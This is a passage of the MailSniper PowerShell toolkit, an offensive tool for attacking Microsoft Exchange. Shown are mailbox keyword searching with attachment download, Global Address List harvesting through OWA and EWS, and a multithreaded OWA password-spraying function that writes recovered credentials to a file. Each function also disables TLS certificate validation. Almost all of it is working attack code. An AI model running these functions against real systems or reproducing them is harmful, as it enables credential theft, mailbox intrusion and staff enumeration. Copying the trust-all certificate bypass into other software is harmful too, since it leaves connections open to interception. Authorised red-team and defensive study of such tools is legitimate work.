                      Write-Output ("Found attachment " + $attachment.Name)
                      $PostSearchList += $item
                      if ($DownloadDir -ne "")
                      { 
                        $prefix = Get-Random
                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
                        $DownloadFile.Close()
                      }
                    }
                  }
                }
                else 
                {
                  foreach($regularexpresion in $Regex)
                  {
                    if ($plaintext -match $regularexpresion)
                    {
                    Write-Output ("Found attachment " + $attachment.Name)
                    $PostSearchList += $item
                      if ($DownloadDir -ne "")
                      { 
                        $prefix = Get-Random
                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
                        $DownloadFile.Close()
                      }
                    }
                    elseif ($plaintext -match $regularexpresion)
                    {
                    Write-Output ("Found attachment " + $attachment.Name)
                    $PostSearchList += $item
                      if ($DownloadDir -ne "")
                      { 
                        $prefix = Get-Random
                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
                        $DownloadFile.Close()
                      }
                    }
                  }    
                }
              }
            }
          }
        }
      }
    }
    
    else{
    Foreach($foldername in $CustomFolderObj)
    {
        Write-Output "[***] Found folder: $($foldername.DisplayName)"
    
      try
      {
        $Inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$foldername.Id)
      }
      catch
      {
        $ErrorMessage = $_.Exception.Message
        if ($ErrorMessage -like "*Exchange Server doesn't support the requested version.*")
        {
          Write-Output "[*] ERROR: The connection to Exchange failed using Exchange Version $ExchangeVersion."
          Write-Output "[*] Try setting the -ExchangeVersion flag to the Exchange version of the server."
          Write-Output "[*] Some options to try: Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1."
          break
        }
      }
     
      $PropertySet = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
      $PropertySet.RequestedBodyType = [Microsoft.Exchange.WebServices.Data.BodyType]::Text
     
      $mails = $Inbox.FindItems($MailsPerUser)   
      
      if ($regex -eq "")
      {
        Write-Output ("[*] Now searching mailbox: $Mailbox for the terms $Terms.")
      }
      else 
      {
        Write-Output ("[*] Now searching the mailbox: $Mailbox with the supplied regular expression.")    
      }

      foreach ($item in $mails.Items)
      {    
        $item.Load($PropertySet)
        if ($Regex -eq "")
        {
          foreach($specificterm in $Terms)
          {
            if ($item.Body.Text -like $specificterm)
            {
            $PostSearchList += $item
            }
            elseif ($item.Subject -like $specificterm)
            {
            $PostSearchList += $item
            }
          }
        }
        else 
        {
          foreach($regularexpresion in $Regex)
          {
            if ($item.Body.Text -match $regularexpresion)
            {
            $PostSearchList += $item
            }
            elseif ($item.Subject -match $regularexpresion)
            {
            $PostSearchList += $item
            }
          }    
        }
        if ($CheckAttachments)
        {
          foreach($attachment in $item.Attachments)
          {
            if($attachment -is [Microsoft.Exchange.WebServices.Data.FileAttachment])
            {
              if($attachment.Name.Contains(".txt") -Or $attachment.Name.Contains(".htm") -Or $attachment.Name.Contains(".pdf") -Or $attachment.Name.Contains(".ps1") -Or $attachment.Name.Contains(".doc") -Or $attachment.Name.Contains(".xls") -Or $attachment.Name.Contains(".bat") -Or $attachment.Name.Contains(".msg"))
              {
                $attachment.Load() | Out-Null
                $plaintext = [System.Text.Encoding]::ASCII.GetString($attachment.Content)
                if ($Regex -eq "")
                {
                  foreach($specificterm in $Terms)
                  {
                    if ($plaintext -like $specificterm)
                    {
                      Write-Output ("Found attachment " + $attachment.Name)
                      $PostSearchList += $item
                      if ($DownloadDir -ne "")
                      { 
                        $prefix = Get-Random
                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + "-" + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
                        $DownloadFile.Close()
                      }
                    }
                    elseif ($plaintext -like $specificterm)
                    {
                      Write-Output ("Found attachment " + $attachment.Name)
                      $PostSearchList += $item
                      if ($DownloadDir -ne "")
                      { 
                        $prefix = Get-Random
                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
                        $DownloadFile.Close()
                      }
                    }
                  }
                }
                else 
                {
                  foreach($regularexpresion in $Regex)
                  {
                    if ($plaintext -match $regularexpresion)
                    {
                    Write-Output ("Found attachment " + $attachment.Name)
                    $PostSearchList += $item
                      if ($DownloadDir -ne "")
                      { 
                        $prefix = Get-Random
                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
                        $DownloadFile.Close()
                      }
                    }
                    elseif ($plaintext -match $regularexpresion)
                    {
                    Write-Output ("Found attachment " + $attachment.Name)
                    $PostSearchList += $item
                      if ($DownloadDir -ne "")
                      { 
                        $prefix = Get-Random
                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
                        $DownloadFile.Close()
                      }
                    }
                  }    
                }
              }
            }
          }
        }
      }
    }
   } 

  $PostSearchList | ft -Property Sender,ReceivedBy,Subject,Body
  if ($OutputCsv -ne "")
  { 
    $PostSearchList | %{ $_.Body = $_.Body -replace "`r`n",'\n' -replace ",",'&#44;'}
    $PostSearchList | Select-Object Sender,ReceivedBy,Subject,Body | Export-Csv $OutputCsv -encoding "UTF8"
  }

}

function Get-MailboxFolders{

<#
  .SYNOPSIS

    This module will connect to a Microsoft Exchange server using Exchange Web Services to gather a list of folders from the current user's mailbox. 

    MailSniper Function: Get-MailboxFolders
    Author: Beau Bullock (@dafthack)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

  .DESCRIPTION

    This module will connect to a Microsoft Exchange server using Exchange Web Services to gather a list of folders from the current user's mailbox. 
  
  .PARAMETER ExchHostname

    The hostname of the Exchange server to connect to.

  .PARAMETER Mailbox

    Email address of the current user the PowerShell process is running as.

  .PARAMETER ExchangeVersion

    In order to communicate with Exchange Web Services the correct version of Microsoft Exchange Server must be specified. By default this script tries "Exchange2010". Additional options to try are  Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1.
  
  .PARAMETER OutFile

    Outputs the results of the search to a file.

  .PARAMETER Remote

    A switch for performing the search remotely across the Internet against a system hosting EWS. Instead of utilizing the current user's credentials if the -Remote option is added a new credential box will pop up for accessing the remote EWS service. 
  
  .EXAMPLE

    C:\PS> Get-MailboxFolders -Mailbox current-user@domain.com 

    Description
    -----------
    This command will connect to the Exchange server autodiscovered from the email address entered using Exchange Web Services and enumerate all of the folders and subfolders from the mailbox.

  .EXAMPLE

    C:\PS> Get-MailboxFolders -Mailbox current-user@domain.com -ExchHostname mail.domain.com -OutFile folders.txt -Remote

    Description
    -----------
    This command will connect to the remote Exchange server specified with -ExchHostname using Exchange Web Services and enumerate all of the folders and subfolders from the mailbox and output to a file called 'folders.txt'. Since the -Remote flag was passed a new credential box will popup asking for the user's credentials to authenticate to the remote EWS. The username should be the user's domain login (i.e. domain\username) but depending on how internal UPN's were setup it might accept the user's email address (i.e. user@domain.com).

#>
  Param(

    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $Mailbox = "",

    [Parameter(Position = 1, Mandatory = $false)]
    [system.URI]
    $ExchHostname = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $OutFile = "",

    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $ExchangeVersion = "Exchange2010",

    [Parameter(Position = 4, Mandatory = $False)]
    [switch]
    $Remote

  )
  #Running the LoadEWSDLL function to load the required Exchange Web Services dll
  LoadEWSDLL

  Write-Output "[*] Trying Exchange version $ExchangeVersion"
  $ServiceExchangeVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::$ExchangeVersion

  $service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService($ServiceExchangeVersion)

  #If the -Remote flag was passed prompt for the user's domain credentials.
  if ($Remote)
  {
    $remotecred = Get-Credential
    $service.UseDefaultCredentials = $false
    $service.Credentials = $remotecred.GetNetworkCredential()
  }
  else
  {
    #Using current user's credentials to connect to EWS
    $service.UseDefaultCredentials = $true
  }

  ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
  ## Code From http://poshcode.org/624

  ## Create a compilation environment
  $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
  $Compiler=$Provider.CreateCompiler()
  $Params=New-Object System.CodeDom.Compiler.CompilerParameters
  $Params.GenerateExecutable=$False
  $Params.GenerateInMemory=$True
  $Params.IncludeDebugInformation=$False
  $Params.ReferencedAssemblies.Add("System.DLL") > $null

  $TASource=@'
    namespace Local.ToolkitExtensions.Net.CertificatePolicy{
      public class TrustAll : System.Net.ICertificatePolicy {
        public TrustAll() { 
        }
        public bool CheckValidationResult(System.Net.ServicePoint sp,
          System.Security.Cryptography.X509Certificates.X509Certificate cert, 
          System.Net.WebRequest req, int problem) {
          return true;
        }
      }
    }
'@ 
  $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
  $TAAssembly=$TAResults.CompiledAssembly

  ## We now create an instance of the TrustAll and attach it to the ServicePointManager
  $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
  [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll

  ## end code from http://poshcode.org/624
    
  if ($ExchHostname -ne "")
  {
    ("[*] Using EWS URL " + "https://" + $ExchHostname + "/EWS/Exchange.asmx")
    $service.Url = new-object System.Uri(("https://" + $ExchHostname + "/EWS/Exchange.asmx"))
  }
  else
  {
    ("[*] Autodiscovering email server for " + $Mailbox + "...")
    $service.AutoDiscoverUrl($Mailbox, {$true})
  }    

    Write-Output ("[*] Now searching mailbox: $Mailbox for folders.")
    $msgfolderroot = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::MsgFolderRoot
    $mbx = New-Object Microsoft.Exchange.WebServices.Data.Mailbox( $Mailbox )
    $FolderId = New-Object Microsoft.Exchange.WebServices.Data.FolderId( $msgfolderroot, $mbx)  
    $rootFolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$FolderId)
    $folderView = [Microsoft.Exchange.WebServices.Data.FolderView]100
    $folderView.Traversal='Deep'
    $rootFolder.Load()
    $CustomFolderObj = $rootFolder.FindFolders($folderView) 
    $AllFolders = @()
    Foreach($foldername in $CustomFolderObj)
    {
        Write-Output "[***] Found folder: $($foldername.DisplayName)"
        $AllFolders += $foldername.DisplayName
    }
    Write-Output ("[*] A total of " + $AllFolders.count + " folders were discovered.")

    if ($OutFile -ne "")
    {
      $AllFolders | Out-File -Encoding ascii $OutFile
    }

}

function Get-GlobalAddressList{

<#
  .SYNOPSIS

    This module will first attempt to connect to an Outlook Web Access portal and utilize the "FindPeople" method (only available in Exchange2013 and up) of gathering email addresses from the Global Address List. If this does not succeed the script will attempt to connect to Exchange Web Services where it will attempt to gather the Global Address List. 

    MailSniper Function: Get-GlobalAddressList
    Author: Beau Bullock (@dafthack)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

        This module will first attempt to connect to an Outlook Web Access portal and utilize the "FindPeople" method (only available in Exchange2013 and up) of gathering email addresses from the Global Address List. If this does not succeed the script will attempt to connect to Exchange Web Services where it will attempt to gather the Global Address List. 

    .PARAMETER ExchHostname

        The hostname of the Exchange server to connect to.
 
    .PARAMETER ExchangeVersion

        In order to communicate with Exchange Web Services the correct version of Microsoft Exchange Server must be specified. By default this script tries "Exchange2010". Additional options to try are  Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1.
  
    .PARAMETER OutFile

        Outputs the results of the search to a text file.

    .PARAMETER UserName

        Username or the email account of the credential to authenticate to OWA/EWS with. Username must include domain (i.e. domain\username) or user@domain.com.

    .PARAMETER Password

        Password of the email account.

    .PARAMETER StartRow

        Row to start fetching from. (Default: 0)

    .PARAMETER MaxRows

        Maximum number of records to fetch per request.  (Default: 5000)

  
  .EXAMPLE

    C:\PS> Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\username -Password Fall2016 -OutFile global-address-list.txt

    Description
    -----------
    This command will connect to the Exchange server at mail.domain.com and attempt to login to OWA with the username domain\username and password of Fall2016. If successful it will write the results to a file called global-address-list.txt. 

#>
  Param(


    [Parameter(Position = 0, Mandatory = $false)]
    [system.URI]
    $ExchHostname = "",

    [Parameter(Position = 1, Mandatory = $False)]
    [string]
    $OutFile = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $ExchangeVersion = "Exchange2010",

    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $UserName = "",

    [Parameter(Position = 4, Mandatory = $False)]
    [string]
    $Password = "",

    [Parameter(Position = 5, Mandatory = $False)]
    [string]
    $StartRow = 0,

    [Parameter(Position = 6, Mandatory = $False)]
    [string]
    $MaxRows = 5000

  )
    ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
    ## Code From http://poshcode.org/624

    ## Create a compilation environment
    $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
    $Compiler=$Provider.CreateCompiler()
    $Params=New-Object System.CodeDom.Compiler.CompilerParameters
    $Params.GenerateExecutable=$False
    $Params.GenerateInMemory=$True
    $Params.IncludeDebugInformation=$False
    $Params.ReferencedAssemblies.Add("System.DLL") > $null

    $TASource=@'
    namespace Local.ToolkitExtensions.Net.CertificatePolicy{
      public class TrustAll : System.Net.ICertificatePolicy {
        public TrustAll() { 
        }
        public bool CheckValidationResult(System.Net.ServicePoint sp,
          System.Security.Cryptography.X509Certificates.X509Certificate cert, 
          System.Net.WebRequest req, int problem) {
          return true;
        }
      }
    }
'@ 
    $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
    $TAAssembly=$TAResults.CompiledAssembly

    ## We now create an instance of the TrustAll and attach it to the ServicePointManager
    $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
    [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll

    ## end code from http://poshcode.org/624
    $ErrorActionPreference = "Stop"

    try
    {
        #First, we try to connect to OWA to utilize the FindPeople method which is much faster than enumerating the GAL through EWS. However, this feature is only available in Exchange 2013 and up.
        #This method also requires that you are running PowerShell version 3.0.
        Write-Host -ForegroundColor "yellow" "[*] First trying to log directly into OWA to enumerate the Global Address List using FindPeople..."
        Write-Host -ForegroundColor "yellow" "[*] This method requires PowerShell Version 3.0"
        #Setting up URL's for later
        $OWAURL = ("https://" + $ExchHostname + "/owa/auth.owa")
        $OWAURL2 = ("https://" + $ExchHostname + "/owa/")
        $GetPeopleFiltersURL = ("https://" + $ExchHostname + "/owa/service.svc?action=GetPeopleFilters") 
        $FindPeopleURL = ("https://" + $ExchHostname + "/owa/service.svc?action=FindPeople")
        Write-Output "[*] Using $OWAURL"
        
        #Setting POST parameters for the login to OWA
        $POSTparams = @{destination="$OWAURL2";flags='4';forcedownlevel='0';username="$UserName";password="$Password";isUtf8='1'}
    
        Write-Output "[*] Logging into OWA..."
        #Logging into Outlook Web Access
        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body $POSTparams -MaximumRedirection 0 -SessionVariable owasession -ErrorAction Ignore
        $out = $owalogin.RawContent
        #Looking in the results for the OWA cadata cookie to determine whether authentication was successful or not.
        if ($out -like "*cadata*")
        {
            Write-Host -ForegroundColor "green" "[*] OWA Login appears to be successful."
        }
        else
        {
            Write-Host -ForegroundColor "red" "[*] OWA login appears to have failed."
            Write-Error ""
        }

        Write-Output "[*] Retrieving OWA Canary..."
        
        #In order to gather the AddressListId from GetPeopleFilters the X-OWA-CANARY cookie must be retrieved from the /owa/ page and set as a header
        $owaGetCanary = Invoke-WebRequest -Uri $OWAURL2 -Method GET -WebSession $owasession -ErrorAction SilentlyContinue
        $owacookies = $owasession.Cookies.GetCookies($OWAURL)
    
        if ($owacookies -like "*OWA-CANARY*")
        {
            foreach ($cookie in $owacookies)
            {
                if ($cookie -like "*canary*")
                {
                    $CanaryCookie = $cookie.value
                    if ($CanaryCookie)
                    {
                        Write-Host -ForegroundColor "green" "[*] Successfully retrieved the $($cookie.name) cookie: $($cookie.value)"
                    }
                    else
                    {
                        Write-Host -ForegroundColor "red" "[*] Unable to retrieve OWA canary."
                        Write-Error ""
                    }
                }
            }
        }
        else
        {
            Write-Host -ForegroundColor "red" "[*] Unable to retrieve OWA canary."
            Write-Error ""
        }

        Write-Output "[*] Retrieving AddressListId from GetPeopleFilters URL."
        
        #In order to use the FindPeople method the AddressListId of the GAL must be obtained. This can be found by sending a POST request to the GetPeopleFilters function.
        $retrieveAddressListId = Invoke-WebRequest -Uri $GetPeopleFiltersURL -Method POST -ContentType "application/json" -Body "{}" -Headers @{"X-OWA-CANARY"="$CanaryCookie";"Action"="GetPeopleFilters"} -WebSession $owasession
        $AddressListIdRaw = @()
        $AddressListIdRaw = $retrieveAddressListId.RawContent
        $AddressListArray = $AddressListIdRaw -split "},{", 0, "simplematch" 

        #Cleaning up results of GetPeopleFilter response to get just the AddressListId
        foreach($line in $AddressListArray)
        {
            if ($line -like "*Global Address List*")
            {
                $split1 = $line -split 'Default Global Address List","FolderId":{"__type":"AddressListId:#Exchange","Id":"', 0, "simplematch"
                $split2 = $split1[1] -split '"},"IsReadOnly', 0, "simplematch"
                $AddressListId = $split2[0]
            }
        }
            if ($AddressListId)
            {
                Write-Host -ForegroundColor "green" "[*] Global Address List Id of $AddressListId was found."
            }
            else
            {
                Write-Host -ForegroundColor "red" "[*] Failed to gather the Global Address List Id."
                Write-Error ""
            }

        $emailspre = @()

        Write-Output "[*] Now utilizing FindPeople to retrieve Global Address List"
		
		# setup variables for use in paging.
        $recordsFound = $true
        $start = $StartRow
        $maxRows = $MaxRows

        while ($recordsFound) {
            #Finally we connect to the FindPeople function using the AddressListId to gather the email addresses
            $FindPeopleResults = Invoke-WebRequest -Uri $FindPeopleURL -Method POST -ContentType "application/json" -Body "{`"__type`":`"FindPeopleJsonRequest:#Exchange`",`"Header`":{`"__type`":`"JsonRequestHeaders:#Exchange`",`"RequestServerVersion`":`"Exchange2013`",`"TimeZoneContext`":{`"__type`":`"TimeZoneContext:#Exchange`",`"TimeZoneDefinition`":{`"__type`":`"TimeZoneDefinitionType:#Exchange`",`"Id`":`"Mountain Standard Time`"}}},`"Body`":{`"__type`":`"FindPeopleRequest:#Exchange`",`"IndexedPageItemView`":{`"__type`":`"IndexedPageView:#Exchange`",`"BasePoint`":`"Beginning`",`"Offset`":$start,`"MaxEntriesReturned`":$maxRows},`"QueryString`":null,`"ParentFolderId`":{`"__type`":`"TargetFolderId:#Exchange`",`"BaseFolderId`":{`"__type`":`"AddressListId:#Exchange`",`"Id`":`"$AddressListId`"}},`"PersonaShape`":{`"__type`":`"PersonaResponseShape:#Exchange`",`"BaseShape`":`"Default`"},`"ShouldResolveOneOffEmailAddress`":false}}" -Headers @{"X-OWA-CANARY"="$CanaryCookie";"Action"="FindPeople"} -WebSession $owasession
            
            $start += $maxRows
            
			if($FindPeopleResults.RawContent.IndexOf("""ResultSet"":[]") -gt -1)
            {
				#if no results are returned, we've reached the end and can exit the loop.
                $recordsFound = $false
            }

            if($recordsFound)
            {
                $FPPreClean = @()
                $FPPreClean = $FindPeopleResults.RawContent
                $FPPreArray = $FPPreClean -split '"EmailAddress":"', 0, "simplematch"
                $FPPreArray[0] = ""
                $cleanarray = @()
                foreach ($entry in $FPPreArray)
                {
                    if ($entry -ne "")
                    {
                        $cleanarray += $entry
                    }
                }

                foreach ($line2 in $cleanarray)
                {
                    $split3 = $line2 -split '","RoutingType"', 0, "simplematch"
                    $emailspre += $split3[0]
                }

                Write-Output "[*] Now cleaning up the list..."
                $GlobalAddressList = $emailspre | Sort-Object | Get-Unique
                Write-Host -ForegroundColor "green" ("[*] Start = " + $start + ", Maxrows = " + $maxRows + ", Total Records = " + $GlobalAddressList.count)
            }
        }

        Write-Output $GlobalAddressList
        Write-Host -ForegroundColor "green" ("[*] A total of " + $GlobalAddressList.count + " email addresses were retrieved")

        #writing results to file
        If ($OutFile -ne "")
        {
            $GlobalAddressList | Out-File -Encoding ascii $OutFile
            Write-Output "[*] Email addresses have been written to $OutFile"
        }
    }
    catch
    {
        Write-Host -ForegroundColor "yellow" "`r`n[*] FindPeople method failed. Trying Exchange Web Services..."
        #Running the LoadEWSDLL function to load the required Exchange Web Services dll
        LoadEWSDLL

        Write-Output "[*] Trying Exchange version $ExchangeVersion"
        $ServiceExchangeVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::$ExchangeVersion
        $service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService($ServiceExchangeVersion)
        
        #converting creds to use with EWS
        $userPassword = $Password | ConvertTo-SecureString -AsPlainText -Force

        $remotecred = New-Object System.Management.Automation.PSCredential -ArgumentList $UserName,$userPassword
        $service.UseDefaultCredentials = $false
        $service.Credentials = $remotecred.GetNetworkCredential()
                
        if ($ExchHostname -ne "")
        {
            ("[*] Using EWS URL " + "https://" + $ExchHostname + "/EWS/Exchange.asmx")
            $service.Url = new-object System.Uri(("https://" + $ExchHostname + "/EWS/Exchange.asmx"))
        }
        else
        {
            ("[*] Autodiscovering email server for " + $Mailbox + "...")
            $service.AutoDiscoverUrl($Mailbox, {$true})
        }    

        $rootfolder = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox
        $mbx = New-Object Microsoft.Exchange.WebServices.Data.Mailbox( $Mailbox )
        $FolderId = New-Object Microsoft.Exchange.WebServices.Data.FolderId( $rootfolder, $mbx)   
        try
        {
            $Inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$FolderId)
        }
        catch
        {
            $ErrorMessage = $_.Exception.Message
            if ($ErrorMessage -like "*Exchange Server doesn't support the requested version.*")
            {
                Write-Output "[*] ERROR: The connection to Exchange failed using Exchange Version $ExchangeVersion."
                Write-Output "[*] Try setting the -ExchangeVersion flag to the Exchange version of the server."
                Write-Output "[*] Some options to try: Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1."
                break
            }
        }
  
        #Creating an array of letters A through Z
        $AtoZ = @()
        65..90 | foreach-object{$AtoZ+=[char]$_}
        $lettercombinations = @()
  
        #Creating an array of two letter variables AA to ZZ
        Foreach ($letter in $AtoZ)
        {
            $AtoZ | foreach-object{$lettercombinations += ($letter + $_)}
        }

        Write-Output "[*] Now attempting to gather the Global Address List. This might take a while...`r`n"

        #The ResolveName function only will return a max of 100 results from the Global Address List. So we search two letter combinations to try and retrieve as many as possible.
        $GlobalAddressList = @()
        foreach($combo in $lettercombinations)
        {
            $galresults = $service.ResolveName($combo)
            foreach($item in $galresults)
            {
                Write-Output $item.Mailbox.Address
                $GlobalAddressList += $item.Mailbox
            }

        }
        Write-Output "[*] Now cleaning up the list..."
        $GlobalAddressList = $GlobalAddressList | Sort-Object | Get-Unique
        Write-Output ("A total of " + $GlobalAddressList.count + " email addresses were retrieved")
        If ($OutFile -ne "")
        {
            $GlobalAddressList | Select-Object Address | Out-File -Encoding ascii $OutFile
        }
    }
}

function Invoke-PasswordSprayOWA{

<#
  .SYNOPSIS

    This module will first attempt to connect to an Outlook Web Access portal and perform a password spraying attack using a userlist and a single password. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!

    MailSniper Function: Invoke-PasswordSprayOWA
    Author: Beau Bullock (@dafthack)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

        This module will first attempt to connect to an Outlook Web Access portal and perform a password spraying attack using a userlist and a single password. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!

    .PARAMETER ExchHostname

        The hostname of the Exchange server to connect to.
 
    .PARAMETER OutFile

        Outputs the results to a text file.

    .PARAMETER UserList

        List of usernames 1 per line to to attempt to password spray against.

    .PARAMETER Password

        A single password to attempt a password spray with.

    .PARAMETER Threads
       
        Number of password spraying threads to run.

    .PARAMETER Domain

        Specify a domain to be used with each spray. Alternatively the userlist can have users in the format of DOMAIN\username or username@domain.com

  
  .EXAMPLE

    C:\PS> Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile owa-sprayed-creds.txt

    Description
    -----------
    This command will connect to the Outlook Web Access server at https://mail.domain.com/owa/ and attempt to password spray a list of usernames with a single password over 15 threads and write to a file called owa-sprayed-creds.txt.

#>
  Param(


    [Parameter(Position = 0, Mandatory = $false)]
    [system.URI]
    $ExchHostname = "",

    [Parameter(Position = 1, Mandatory = $False)]
    [string]
    $OutFile = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $UserList = "",

    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $Password = "",

    [Parameter(Position = 4, Mandatory = $False)]
    [string]
    $Threads = "5",

    [Parameter(Position = 6, Mandatory = $False)]
    [string]
    $Domain = ""

  )
    
    Write-Host -ForegroundColor "yellow" "[*] Now spraying the OWA portal at https://$ExchHostname/owa/"
    $currenttime = Get-Date
    Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"
    #Setting up URL's for later
    $OWAURL = ("https://" + $ExchHostname + "/owa/auth.owa")
    $OWAURL2 = ("https://" + $ExchHostname + "/owa/")
     
    $Usernames = Get-Content $UserList
    $count = $Usernames.count
    $sprayed = @()
    $userlists = @{}
    $count = 0 
    $Usernames |% {$userlists[$count % $Threads] += @($_);$count++}

    0..($Threads-1) |% {

    Start-Job -ScriptBlock{

    ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
    ## Code From http://poshcode.org/624

    ## Create a compilation environment
    $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
    $Compiler=$Provider.CreateCompiler()
    $Params=New-Object System.CodeDom.Compiler.CompilerParameters
    $Params.GenerateExecutable=$False
    $Params.GenerateInMemory=$True
    $Params.IncludeDebugInformation=$False
    $Params.ReferencedAssemblies.Add("System.DLL") > $null

    $TASource=@'
    namespace Local.ToolkitExtensions.Net.CertificatePolicy{
      public class TrustAll : System.Net.ICertificatePolicy {
        public TrustAll() { 
        }
        public bool CheckValidationResult(System.Net.ServicePoint sp,
          System.Security.Cryptography.X509Certificates.X509Certificate cert, 
          System.Net.WebRequest req, int problem) {
          return true;
        }
      }
    }
'@ 
    $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
    $TAAssembly=$TAResults.CompiledAssembly

    ## We now create an instance of the TrustAll and attach it to the ServicePointManager
    $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
    [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll

    $Password = $args[1]
    $OWAURL2 = $args[2]
    $OWAURL = $args[3]
    $Domain = $args[4]

    ## end code from http://poshcode.org/624
    ForEach($Username in $args[0])
    {
        #Logging into Outlook Web Access    
        $ProgressPreference = 'silentlycontinue'
	if ($Domain -ne "")
    {
        $Username = ("$Domain" + "\" + "$Username")
    }

    $cadatacookie = ""
    $sess = ""
	$owa = Invoke-WebRequest -Uri $OWAURL2 -SessionVariable sess -ErrorAction SilentlyContinue 
	$form = $owa.Forms[0]
	$form.fields.password=$Password
	$form.fields.username=$Username
        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body  $form.Fields -MaximumRedirection 2 -SessionVariable sess -ErrorAction SilentlyContinue 
        #Check cookie in response
        $cookies = $sess.Cookies.GetCookies($OWAURL2)
        foreach ($cookie in $cookies)
        {
            if ($cookie.Name -eq "cadata")
                {
                $cadatacookie = $cookie.Value
                }
        }
	if ($cadatacookie)
	{
		Write-Output "[*] SUCCESS! User:$username Password:$password"
	}
	$curr_user+=1 

    }
    } -ArgumentList $userlists[$_], $Password, $OWAURL2, $OWAURL, $Domain | Out-Null

}
$Complete = Get-Date
$MaxWaitAtEnd = 10000
$SleepTimer = 200
        $fullresults = @()
While ($(Get-Job -State Running).count -gt 0){
    $RunningJobs = ""
    ForEach ($Job  in $(Get-Job -state running)){$RunningJobs += ", $($Job.name)"}
    $RunningJobs = $RunningJobs.Substring(2)
    Write-Progress  -Activity "Password Spraying the OWA portal at https://$ExchHostname/owa/. Sit tight..." -Status "$($(Get-Job -State Running).count) threads remaining" -PercentComplete ($(Get-Job -State Completed).count / $(Get-Job).count * 100)
    If ($(New-TimeSpan $Complete $(Get-Date)).totalseconds -ge $MaxWaitAtEnd){"Killing all jobs still running . . .";Get-Job -State Running | Remove-Job -Force}
    Start-Sleep -Milliseconds $SleepTimer
    ForEach($Job in Get-Job){
        $JobOutput = Receive-Job $Job
        Write-Output $JobOutput
        $fullresults += $JobOutput
    }

}

    Write-Output ("[*] A total of " + $fullresults.count + " credentials were obtained.")
    if ($OutFile -ne "")
       {
            $fullresults = $fullresults -replace '\[\*\] SUCCESS! User:',''
            $fullresults = $fullresults -replace " Password:", ":"
            $fullresults | Out-File -Encoding ascii $OutFile
            Write-Output "Results have been written to $OutFile."
       }
}


function Invoke-PasswordSprayEWS{

<#
